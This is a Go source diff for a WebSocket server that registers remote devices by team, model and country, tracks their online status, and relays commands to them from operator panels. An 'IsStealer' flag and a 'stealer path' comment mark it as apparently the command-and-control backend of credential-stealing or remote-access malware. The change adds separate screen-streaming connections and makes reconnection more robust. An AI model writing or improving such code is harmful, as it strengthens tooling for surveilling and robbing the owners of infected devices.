@@ -44,6 +44,7 @@ type DeviceConn struct {
 	Height    int
 	ConnectAt time.Time
 	IsStealer bool
+	IsScreen  bool // register_screen connection — not used for commands
 	mu        sync.Mutex
 }
 
@@ -59,7 +60,8 @@ type PanelConn struct {
 
 type Hub struct {
 	mu              sync.RWMutex
-	devices         map[string]*DeviceConn
+	devices         map[string]*DeviceConn // main control connections (register_device)
+	screens         map[string]*DeviceConn // screen-only connections (register_screen)
 	panels          map[string]*PanelConn
 	OnDeviceConnect func(teamID, deviceID, model, country string)
 	OnPanelAction   func(teamID, login, role, action, deviceID, details string)
@@ -67,11 +69,19 @@ type Hub struct {
 
 var H = &Hub{
 	devices: make(map[string]*DeviceConn),
+	screens: make(map[string]*DeviceConn),
 	panels:  make(map[string]*PanelConn),
 }
 
 func (h *Hub) AddDevice(d *DeviceConn) {
 	h.mu.Lock()
+	if d.IsScreen {
+		// Screen connections go into a separate map — they must not overwrite
+		// the main control connection or affect online/offline status.
+		h.screens[d.ID] = d
+		h.mu.Unlock()
+		return
+	}
 	h.devices[d.ID] = d
 	h.mu.Unlock()
 
@@ -143,10 +153,45 @@ func (h *Hub) replayPendingCommands(d *DeviceConn) {
 	}
 }
 
+// RemoveDeviceConn removes a specific connection from the hub.
+// For screen connections it only cleans up the screens map.
+// For main connections it only removes if the stored pointer matches,
+// preventing a late-arriving screen disconnect from wiping the main entry.
+func (h *Hub) RemoveDeviceConn(d *DeviceConn) {
+	if d.IsScreen {
+		h.mu.Lock()
+		if h.screens[d.ID] == d {
+			delete(h.screens, d.ID)
+		}
+		h.mu.Unlock()
+		return
+	}
+
+	h.mu.Lock()
+	cur, ok := h.devices[d.ID]
+	if ok && cur == d {
+		delete(h.devices, d.ID)
+	} else {
+		ok = false // pointer mismatch — a newer connection replaced us, don't touch online state
+	}
+	h.mu.Unlock()
+
+	if ok {
+		db.DB.Exec(`UPDATE devices SET is_online = 0, last_seen = CURRENT_TIMESTAMP WHERE device_id = ? AND team_id = ?`, d.ID, d.TeamID)
+		h.NotifyPanels(d.TeamID, map[string]any{
+			"type":      "device_disconnected",
+			"device_id": d.ID,
+		})
+	}
+}
+
+// RemoveDevice is kept for backward compatibility (stealer path uses it).
 func (h *Hub) RemoveDevice(id string) {
 	h.mu.Lock()
 	d, ok := h.devices[id]
-	delete(h.devices, id)
+	if ok {
+		delete(h.devices, id)
+	}
 	h.mu.Unlock()
 
 	if ok {
@@ -156,8 +201,6 @@ func (h *Hub) RemoveDevice(id string) {
 			"device_id": id,
 		})
 	} else {
-		// Device disconnected before being added to the in-memory map (connect race window).
-		// Still mark offline in DB so it doesn't get stuck online.
 		db.DB.Exec(`UPDATE devices SET is_online = 0, last_seen = CURRENT_TIMESTAMP WHERE device_id = ?`, id)
 	}
 }
@@ -346,21 +389,25 @@ func HandleDeviceWS(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	_, msg, err := conn.ReadMessage()
-	if err != nil {
-		log.Printf("[WS] first read failed: %v", err)
-		return
-	}
-
 	var reg map[string]any
-	if json.Unmarshal(msg, &reg) != nil {
-		log.Printf("[WS] bad JSON, len=%d", len(msg))
-		return
+	for attempts := 0; attempts < 5; attempts++ {
+		_, msg, err := conn.ReadMessage()
+		if err != nil {
+			log.Printf("[WS] first read failed: %v", err)
+			return
+		}
+		if json.Unmarshal(msg, &reg) != nil {
+			log.Printf("[WS] bad JSON, len=%d", len(msg))
+			return
+		}
+		msgType, _ := reg["type"].(string)
+		if msgType == "register_device" || msgType == "register_screen" {
+			break
+		}
+		reg = nil
 	}
-
-	msgType, _ := reg["type"].(string)
-	if msgType != "register_device" && msgType != "register_screen" {
-		log.Printf("[WS] unexpected first message type: %q", msgType)
+	if reg == nil {
+		log.Printf("[WS] no register message in first 5 reads")
 		return
 	}
 
@@ -399,6 +446,7 @@ func HandleDeviceWS(w http.ResponseWriter, r *http.Request) {
 		)
 	}
 
+	firstMsgType, _ := reg["type"].(string)
 	dc := &DeviceConn{
 		ID:        deviceID,
 		TeamID:    teamID,
@@ -406,11 +454,16 @@ func HandleDeviceWS(w http.ResponseWriter, r *http.Request) {
 		Width:     width,
 		Height:    height,
 		ConnectAt: time.Now(),
+		IsScreen:  firstMsgType == "register_screen",
 	}
 	H.AddDevice(dc)
-	defer H.RemoveDevice(deviceID)
+	defer H.RemoveDeviceConn(dc)
 
-	log.Printf("[+] Device %s connected (team %s, %dx%d)", deviceID, teamID, width, height)
+	connType := "ctrl"
+	if dc.IsScreen {
+		connType = "screen"
+	}
+	log.Printf("[+] Device %s [%s] connected (team %s, %dx%d)", deviceID, connType, teamID, width, height)
 
 	// Server-side ping: every 30s send a WS ping frame.
 	// If the app is dead but OS keeps the socket open, pong won't arrive
@@ -441,7 +494,11 @@ func HandleDeviceWS(w http.ResponseWriter, r *http.Request) {
 		resetDeadline()
 		msgType, msg, err := conn.ReadMessage()
 		if err != nil {
-			log.Printf("[-] Device %s disconnected: %v", deviceID, err)
+			connType := "ctrl"
+			if dc.IsScreen {
+				connType = "screen"
+			}
+			log.Printf("[-] Device %s [%s] disconnected: %v", deviceID, connType, err)
 			return
 		}
 
